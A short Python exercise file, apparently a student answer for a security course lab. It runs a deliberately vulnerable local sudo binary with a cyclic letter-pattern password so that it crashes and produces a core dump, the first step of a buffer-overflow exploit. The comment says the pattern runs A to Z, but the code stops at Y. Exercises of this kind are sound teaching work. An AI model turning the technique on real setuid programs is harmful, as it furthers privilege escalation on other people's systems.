import os
import sys


def crash_sudo(path_to_sudo: str):
    """
    Execute the sudo program so that it crashes and generates a core dump.

    The same rules and tips from q1.py still apply (you must use the
    `path_to_sudo` value, prefer `os.execl` over `os.system`).

    :param path_to_sudo: The path to the vulnerable sudo program.
    """
    # run the sudo program with the input AAABBBBCCCC...ZZZZ (A till Z four time each letter) as password, and some commend (the command is irrelevent). 
    exploit= ''.join([chr(i)*4 for i in range(65,90)])
    cmd= "echo meaw"
    os.execl(path_to_sudo, path_to_sudo, exploit, cmd)


def main(argv):
    # WARNING: Avoid changing this function.
    if not len(argv) == 1:
        print('Usage: %s' % argv[0])
        sys.exit(1)

    crash_sudo(path_to_sudo='./sudo')


if __name__ == '__main__':
    main(sys.argv)
